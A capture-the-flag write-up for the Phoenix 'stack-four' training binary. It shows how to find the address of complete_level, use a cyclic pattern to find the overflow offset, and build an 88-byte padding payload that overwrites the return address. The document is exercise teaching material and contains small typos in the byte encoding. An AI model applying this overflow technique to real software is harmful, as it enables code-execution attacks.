**Summary:**

Stack-four is an EIP/RIP control classic ctf. You're supposed to
overwrite the stack until you reach the the `$EIP / $RIP` registers 
which are responsible for the next exeecuted instruction. Much more like the
previous challenges except this time we'll have to determine how many characters
do we need to overflow the stack and leave only 4 bytes to to be overwritten
with our desired address, which is the offset of complete_level

**Solution:**

Let's first findout the offset of the function complete_level
```bash
$ objdump -M intel -d stack-four | grep complete_level
000000000040061d <complete_level>:
```
we can translate this to `address = '\x1d\06\40'`

Using `pwntools` we could generate a pattern and use to determine how many
characters we need preceding the $EIP

```bash
$ python -c "from pwn import cyclic;print(cyclic(100))" | ./stack-four 

Welcome to phoenix/stack-four, brought to you by https://exploit.education
and will be returning to 0x6161617861616177
Segmentation fault
```
by ignoring the first 8 bytes, we get 0x61616177 which is our first 4 bytes of $RIP
register, which is what we need to write our address to $RIP

```python
#!/usr/bin/env python

address = '\x1d\x06\x40'
buf = ""
buf += 'A' * 88
buf += address

print buf
```
